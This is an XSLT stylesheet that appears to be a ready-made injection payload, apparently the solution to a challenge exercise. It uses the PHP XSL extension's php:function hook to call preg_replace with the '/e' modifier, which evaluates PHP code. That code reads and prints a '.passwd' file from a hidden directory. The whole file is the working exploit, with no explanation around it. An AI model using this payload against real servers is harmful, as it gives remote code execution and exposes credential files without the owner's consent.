<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:variable name="eval">
        eval("var_dump(file_get_contents('.6ff3200bee785801f420fba826ffcdee/.passwd'));")
</xsl:variable>
<xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
</xsl:template></xsl:stylesheet>
  
